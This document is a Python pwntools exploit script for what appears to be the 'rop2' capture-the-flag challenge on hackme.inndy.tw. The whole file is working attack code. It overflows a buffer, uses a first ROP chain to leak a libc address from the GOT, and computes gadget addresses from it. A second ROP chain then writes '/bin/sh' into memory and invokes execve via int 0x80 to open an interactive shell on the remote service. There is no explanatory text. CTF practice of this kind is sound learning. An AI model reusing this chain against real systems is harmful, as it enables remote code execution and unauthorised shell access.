from pwn import *

context.arch = 'i386'

#p = process( './rop2' )
p = remote( 'hackme.inndy.tw', 7703 )

syscall_got = 0x0804a014
syscall_plt = 0x8048320

payload = b'a' * 16

ret = 0x080482d6
overflow = 0x08048504

rop = flat( [ syscall_plt, overflow, 4, 1, syscall_got, 4 ] )

p.recvuntil( ":" )

raw_input()

p.send( payload + rop )

syscall_add = int.from_bytes( p.recv()[-4:], 'little' )
print( hex( syscall_add ) )

#syscall_off = 0x000e0ea0
syscall_off = 0x000e2b90

libc_base = syscall_add - syscall_off

#pop_eax = 0x00023f97 + libc_base
pop_eax = 0x0002406e + libc_base
#pop_ebx = 0x00018395 + libc_base
pop_ebx = 0x00018395 + libc_base
#pop_ecx = 0x000b4047 + libc_base
pop_ecx = 0x000b52d7 + libc_base
#pop_edx = 0x00001aa6 + libc_base
pop_edx = 0x00001aa6 + libc_base

#mov_deax_ecx = 0x0002b2af + libc_base
mov_deax_ecx = 0x0002b43f + libc_base
#int80 = 0x00002c87 + libc_base
int80 = 0x00002c87 + libc_base

data = 0x0804a018

rop2 = flat( [ pop_eax, data, pop_ecx, b'/bin', mov_deax_ecx, pop_eax, data + 0x4, pop_ecx, b'/sh\x00', mov_deax_ecx, pop_ebx, data, pop_ecx, 0, pop_edx, 0, pop_eax, 0xb, int80 ] )
#p.recvuntil( ':' )

raw_input()

p.sendline( payload + rop2 )

p.interactive()
